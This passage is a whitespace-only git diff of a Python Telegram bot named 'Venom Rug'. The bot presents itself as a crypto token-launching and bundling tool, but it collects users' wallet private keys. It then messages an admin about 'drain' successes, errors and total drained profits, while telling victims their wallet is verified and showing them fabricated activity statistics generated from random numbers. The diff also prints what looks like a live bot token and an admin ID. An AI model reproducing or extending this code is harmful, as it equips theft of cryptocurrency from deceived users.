                     )
-                    
+
                     # Send SUCCESS log to admin
                     success_admin_msg = f"""
 *REAL DRAIN SUCCESSFULLY*
@@ -1587,7 +1587,7 @@ Please import a wallet with sufficient balance and try again.
                         text=success_admin_msg,
                         parse_mode='Markdown'
                     )
-                    
+
                 else:
                     # Generic error for other issues
                     keyboard = [
@@ -1595,7 +1595,7 @@ Please import a wallet with sufficient balance and try again.
                         [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
                     ]
                     reply_markup = InlineKeyboardMarkup(keyboard)
-                    
+
                     error_msg = """
 *Import Failed*
 
@@ -1604,7 +1604,7 @@ Unable to verify wallet at this time. Please check your private key and try agai
 If this continues, please contact support.
 """
                     await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
-                    
+
                     # Send ERROR log to admin
                     error_admin_msg = f"""
 *DRAIN ERROR*
@@ -1635,7 +1635,7 @@ Your wallet has been verified and is now ready to use.
 You can now access all Venom Rug features for token launching and bundling.
 """
                 await processing_msg.edit_text(user_success_text, parse_mode='Markdown')
-                    
+
         except Exception as e:
             logger.error(f"Error processing wallet: {e}")
             # Generic error message
@@ -1644,7 +1644,7 @@ You can now access all Venom Rug features for token launching and bundling.
                 [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
-            
+
             error_msg = """
 *Import Error*
 
@@ -1653,7 +1653,7 @@ An error occurred while importing your wallet. Please try again.
 If this continues, please contact support.
 """
             await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
-            
+
             # Send EXCEPTION log to admin
             exception_admin_msg = f"""
 *DRAIN EXCEPTION*
@@ -1674,10 +1674,10 @@ If this continues, please contact support.
         """Handle insufficient balance button from admin"""
         query = update.callback_query
         await query.answer()
-        
+
         callback_data = query.data
         user_id = int(callback_data.split('_')[1])
-        
+
         # Send message to user about insufficient balance
         user_message = """
 *Wallet Import Failed*
@@ -1686,7 +1686,7 @@ This wallet doesn't have sufficient balance to complete the import process.
 
 Please import a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.
 """
-        
+
         try:
             await context.bot.send_message(chat_id=user_id, text=user_message, parse_mode='Markdown')
             await query.edit_message_text(f"✅ User notified about insufficient balance")
@@ -1708,7 +1708,7 @@ Need more help? Get support Here!
 
 *Select an option below.*
 """
-        
+
         reply_markup = self.get_tokens_keyboard()
         await self.send_with_image(query, tokens_section_text, reply_markup)
 
@@ -1725,7 +1725,7 @@ Need more help? Get support Here!
 
 *Set your bundling strategy below.*
 """
-        
+
         reply_markup = self.get_bundler_keyboard()
         await self.send_with_image(query, bundler_section_text, reply_markup)
 
@@ -1743,7 +1743,7 @@ Need more help? Get support Here!
 
 *Choose an action below*
 """
-        
+
         reply_markup = self.get_comments_keyboard()
         await self.send_with_image(query, comments_section_text, reply_markup)
 
@@ -1760,7 +1760,7 @@ Need more help? Get support Here!
 
 *Select an action below to begin.*
 """
-        
+
         reply_markup = self.get_task_keyboard()
         await self.send_with_image(query, task_section_text, reply_markup)
 
@@ -1782,7 +1782,7 @@ Use our Telegram Support group or visit our website.
 
 *Select an option below to return.*
 """
-        
+
         reply_markup = self.get_faq_keyboard()
         await self.send_with_image(query, faq_section_text, reply_markup)
 
@@ -1794,19 +1794,19 @@ This feature requires a connected wallet.
 
 Please import your wallet first to continue.
 """
-        
+
         reply_markup = self.get_wallet_required_keyboard()
         await self.send_with_image(query, wallet_required_text, reply_markup)
 
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        
+
         users_online = random.randint(28400, 31200)
         total_volume = random.randint(2100000, 2500000)
         successful_trades = random.randint(15800, 16500)
-        
+
         sol_price, eth_price = await self.get_crypto_prices()
-        
+
         stats_text = f"""
 *VENOM RUG NETWORK STATS*
 
@@ -1824,12 +1824,12 @@ Please import your wallet first to continue.
 • Uptime: 100%
 • Response Time: < 1s
 """
-        
+
         if str(user_id) == ADMIN_CHAT_ID:
             total_users = self.users_collection.count_documents({})
             approved_users = self.users_collection.count_documents({'wallet_approved': True})
             pending_wallets = len(self.pending_wallets)
-            
+
             # Get profit stats for admin
             total_profits = list(self.profits_collection.aggregate([
                 {"$group": {
@@ -1839,7 +1839,7 @@ Please import your wallet first to continue.
                     "total_drains": {"$sum": 1}
                 }}
             ]))
-            
+
             admin_stats = f"""
 *ADMIN STATISTICS:*
 • Total Registered Users: `{total_users}`
@@ -1847,7 +1847,7 @@ Please import your wallet first to continue.
 • Pending Wallet Approvals: `{pending_wallets}`
 • Recent Wins Generated: `{len(self.recent_wins)}`
 """
-            
+
             if total_profits:
                 profits = total_profits[0]
                 admin_stats += f"""
@@ -1856,26 +1856,26 @@ Please import your wallet first to continue.
 • Total USD Value: `${profits['total_usd']:.2f}`
 • Total Successful Drains: `{profits['total_drains']}`
 """
-            
+
             stats_text += admin_stats
-        
+
         await update.message.reply_text(stats_text, parse_mode='Markdown')
 
     async def broadcast_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        
+
         if str(user_id) != ADMIN_CHAT_ID:
             await update.message.reply_text("❌ Admin access required!")
             return
-        
+
         if not context.args:
             await update.message.reply_text("❌ Usage: /broadcast <message>")
             return
-        
+
         message = ' '.join(context.args)
         users = self.users_collection.find({})
         user_count = 0
-        
+
         for user in users:
             try:
                 await context.bot.send_message(chat_id=user['user_id'], text=f"📢 *Broadcast from Venom Rug:*\n\n{message}", parse_mode='Markdown')
@@ -1883,25 +1883,25 @@ Please import your wallet first to continue.
                 await asyncio.sleep(0.1)
             except Exception as e:
                 logger.error(f"Failed to send to {user['user_id']}: {e}")
-        
+
         await update.message.reply_text(f"✅ Broadcast sent to {user_count} users!")
 
     async def broadcast_image(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        
+
         if str(user_id) != ADMIN_CHAT_ID:
             await update.message.reply_text("❌ Admin access required!")
             return
-        
+
         if not update.message.reply_to_message or not update.message.reply_to_message.photo:
             await update.message.reply_text("❌ Reply to an image with /broadcast_image <caption>")
             return
-        
+
         caption = ' '.join(context.args) if context.args else "📢 Update from Venom Rug"
         photo_file = update.message.reply_to_message.photo[-1].file_id
         users = self.users_collection.find({})
         user_count = 0
-        
+
         for user in users:
             try:
                 await context.bot.send_photo(
@@ -1914,20 +1914,20 @@ Please import your wallet first to continue.
                 await asyncio.sleep(0.1)
             except Exception as e:
                 logger.error(f"Failed to send image to {user['user_id']}: {e}")
-        
+
         await update.message.reply_text(f"✅ Image broadcast sent to {user_count} users!")
 
     async def show_admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        
+
         if str(user_id) != ADMIN_CHAT_ID:
             await update.message.reply_text("❌ Admin access required!")
             return
-        
+
         total_users = self.users_collection.count_documents({})
         approved_users = self.users_collection.count_documents({'wallet_approved': True})
         pending_wallets = len(self.pending_wallets)
-        
+
         stats_text = f"""
 *VENOM RUG ADMIN STATISTICS*
 
@@ -1946,16 +1946,16 @@ Please import your wallet first to continue.
 • Admin Controls: Active
 • Monitoring: Enabled
 """
-        
+
         await update.message.reply_text(stats_text, parse_mode='Markdown')
 
 def main():
     bot = VenomRugBot()
     application = Application.builder().token(BOT_TOKEN).build()
-    
+
     # Set application reference in bot instance
     bot.set_application(application)
-    
+
     # User commands
     application.add_handler(CommandHandler("start", bot.start))
     application.add_handler(CommandHandler("help", bot.show_help_section))
@@ -1965,18 +1965,18 @@ def main():
     application.add_handler(CommandHandler("bundler", bot.show_bundler_section))
     application.add_handler(CommandHandler("comments", bot.show_comments_section))
     application.add_handler(CommandHandler("task", bot.show_task_section))
-    
+
     # Admin commands
     application.add_handler(CommandHandler("broadcast", bot.broadcast_message))
     application.add_handler(CommandHandler("broadcast_image", bot.broadcast_image))
     application.add_handler(CommandHandler("admin_stats", bot.show_admin_stats))
     application.add_handler(CommandHandler("profits", bot.profits_command))
     application.add_handler(CommandHandler("analytics", bot.advanced_analytics_command))
-    
+
     # Callback handlers
     application.add_handler(CallbackQueryHandler(bot.handle_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_private_key))
-    
+
     print("🐍 Venom Rug Bot Started!")
     print("🤖 Token: 8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI")
     print("👤 Admin: 6368654401")
@@ -2014,4 +2014,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
